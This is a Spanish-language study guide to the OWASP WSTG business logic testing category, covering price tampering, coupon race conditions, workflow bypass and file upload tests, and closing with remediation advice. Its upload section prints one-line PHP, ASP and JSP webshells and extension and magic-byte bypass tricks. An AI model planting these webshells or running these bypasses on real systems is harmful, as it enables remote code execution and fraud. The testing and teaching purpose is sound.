# 4.10 Business Logic Testing (WSTG-BUSL)

## Introducción a la Lógica de Negocio (WSTG-BUSL-00)

El objetivo de esta categoría es encontrar vulnerabilidades que los scanners automáticos **no pueden** detectar, porque dependen del contexto y propósito específico de la aplicación:
- Flujos de negocio que pueden saltarse pasos obligatorios
- Validaciones que solo ocurren en el cliente (JavaScript) y no en el servidor
- Límites de negocio que no se aplican (cantidades negativas, precios en cero, descuentos superiores al 100%)
- Funcionalidades legítimas usadas fuera de su contexto previsto (abuso de features)

A diferencia de las vulnerabilidades técnicas (XSS, SQLi), los defectos de lógica de negocio requieren entender profundamente **qué se supone que debe hacer la aplicación** y luego buscar formas de romper esas suposiciones.

---

## WSTG-BUSL-01: Test Business Logic Data Validation

```bash
# Probar valores fuera de rango
?quantity=-1    # descuento por cantidad negativa → ¿genera precio negativo o crédito?
?price=0.01     # ¿acepta precios irrisorios manipulados desde el cliente?
?discount=200   # ¿descuento mayor al 100%?

# Tipos incorrectos
?amount="1000"  # string en vez de número
?enabled="true" # string booleano en vez de boolean real

# Race conditions en validación de datos
for i in {1..20}; do
  curl -X POST https://target.com/redeem-coupon -d "code=PROMO10" &
done
wait
# Si el cupón de un solo uso se puede redimir múltiples veces → race condition
```

La aplicación debe validar TODOS los datos de negocio en el servidor, independientemente de las validaciones del cliente (que son solo UX, nunca control de seguridad).

---

## WSTG-BUSL-02: Test Ability to Forge Requests

```bash
# Modificar parámetros ocultos que controlan precios/cantidades
# Interceptar con Burp y cambiar:
# price=100.00 → price=0.01
# quantity=1 → quantity=-1 (¿genera crédito en cuenta?)
# discount=10 → discount=100
# currency=USD → currency=XXX (moneda con tasa de cambio favorable manipulada)

# Modificar datos que deberían ser de solo lectura/calculados en servidor:
# order_total, product_id, user_id, shipping_cost en el flujo de pago
POST /checkout
{"product_id": 123, "price": 999.99, "user_price_override": 0.01}
```

Buscar específicamente campos enviados desde el cliente que la aplicación luego usa como si fueran de confianza (price, total, shipping, discount, tax) sin recalcularlos en el servidor.

---

## WSTG-BUSL-03: Test Integrity Checks

- Verificar que existan controles de integridad en datos transmitidos entre pasos de un flujo multi-etapa (ej. checkout en 3 pasos)
- Probar si es posible alterar datos en el paso 1 y que el paso 3 los use sin re-verificar (ej. cambiar precio en paso 1 vía proxy, completar el flujo en paso 3)
- Verificar checksums/firmas en datos críticos (ej. parámetros de un link de descarga firmado) — ¿se pueden recalcular o son vulnerables a manipulación?

---

## WSTG-BUSL-04: Test for Process Timing

```bash
# Comparar tiempos de respuesta para inferir información de negocio
# Ejemplo: tiempo de respuesta diferente si una tarjeta de crédito es válida vs inválida
time curl -X POST https://target.com/validate-card -d "card=4111111111111111"
time curl -X POST https://target.com/validate-card -d "card=4111111111111112"

# Uso de timing para bypass de procesos que requieren "tiempo mínimo"
# (ej. verificación humana simulada, countdown de seguridad)
```

---

## WSTG-BUSL-05: Test Number of Times a Function Can Be Used Limits

```bash
# Verificar que cupones/tokens/intentos de un solo uso no sean reutilizables
# Race condition para usar un recurso limitado múltiples veces simultáneamente:

import threading, requests

def use_coupon():
    requests.post('https://target.com/use-coupon',
                  data={'code':'LIMITED10'},
                  cookies={'session':'victim_token'})

threads = [threading.Thread(target=use_coupon) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]
# Si el cupón "de un solo uso" termina aplicado más de una vez → vulnerable
```

Aplica también a: límite de intentos de login, límite de transferencias diarias, límite de "me gusta"/votos por usuario, límite de descargas, créditos de prueba.

---

## WSTG-BUSL-06: Testing for the Circumvention of Work Flows

```bash
# Identificar flujos de múltiples pasos (ej: carrito → dirección → pago → confirmación)
# Intentar:
# 1. Saltar directamente al último paso sin completar los anteriores
curl -X POST https://target.com/checkout/confirm  # sin haber pasado por /checkout/payment

# 2. Repetir un paso ya completado para obtener un beneficio extra
# (ej. aplicar el mismo cupón de "primer pedido" repetidas veces)

# 3. Realizar pasos en orden distinto al esperado
# (ej. confirmar pedido antes de que se procese el pago)
```

---

## WSTG-BUSL-07: Test Defenses Against Application Misuse

```bash
# Probar abuso de funcionalidades legítimas fuera de su propósito:
# - Sistema de referidos: crear cuentas falsas para auto-referirse y obtener bonos
# - Sistema de reembolsos: solicitar reembolso después de usar el producto/servicio
# - Funcionalidad de "compartir"/invitar: usarla para espam masivo
# - Funcionalidad de búsqueda: usarla para extraer datos masivos (scraping vía paginación)
# - Sistema de calificación/reviews: múltiples cuentas para manipular rating
```

---

## WSTG-BUSL-08: Test Upload of Unexpected File Types

```bash
# Probar subir tipos de archivo no esperados por la lógica de negocio
# Ejemplo: campo de "subir foto de perfil" que acepta ejecutables, scripts, archivos enormes

curl -X POST https://target.com/upload \
  -F "file=@malicious.exe;type=image/jpeg"

curl -X POST https://target.com/upload \
  -F "file=@archive.zip;type=image/png"

# Verificar:
# - Validación real del contenido (magic bytes), no solo extensión/Content-Type declarado
# - Límite de tamaño de archivo aplicado en servidor (no solo en frontend)
# - ¿Permite subir archivos con tipos MIME que no coinciden con el contenido real?
```

---

## WSTG-BUSL-09: Test Upload of Malicious Files

### File Type Bypass para RCE
```bash
# Si valida extensión en cliente/servidor:
# 1. Rename con doble extensión: shell.php → shell.php.jpg
# 2. Null byte (PHP<5.3.4): shell.php%00.jpg
# 3. Variación de case: shell.PHP, shell.Php
# 4. Extensiones alternativas ejecutables: shell.php5, shell.phtml, shell.pht, shell.shtml
# 5. Content-Type bypass: declarar image/jpeg mientras el contenido es PHP
# 6. Magic bytes: anteponer cabecera válida de imagen al código malicioso
#    GIF89a + <?php system($_GET['cmd']); ?>
#    \x89PNG\r\n... + código PHP al final del archivo

# Webshells básicas por lenguaje:
# PHP:
<?php system($_GET['c']); ?>

# ASP:
<%Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("c")).StdOut.ReadAll())%>

# JSP:
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### Otros Vectores de Archivos Maliciosos
- **Zip bombs / decompression bombs**: archivos comprimidos que se expanden a tamaños enormes → DoS
- **Polyglot files**: archivos válidos en dos formatos simultáneamente (ej. GIF+JS, o JPEG+PHP) para bypass de validación
- **XXE en archivos XML/SVG/DOCX subidos** (ver WSTG-INPV-07)
- **ZIP slip**: archivos comprimidos con paths `../../../` que al descomprimirse escriben fuera del directorio esperado

```bash
# Verificar si el servidor re-procesa/ejecuta el archivo subido (ej. genera thumbnail con ImageMagick)
# → posibles vulnerabilidades como ImageTragick (CVE-2016-3714)
```

### Remediación General (BUSL)
- Nunca confiar en validaciones del lado del cliente para reglas de negocio
- Recalcular siempre en el servidor: precios, totales, descuentos, cantidades
- Aplicar rate limiting y controles anti-automatización en funciones sensibles
- Validar contenido real de archivos subidos (magic bytes), no solo extensión/MIME declarado
- Diseñar flujos multi-paso con verificación de estado en servidor en cada transición
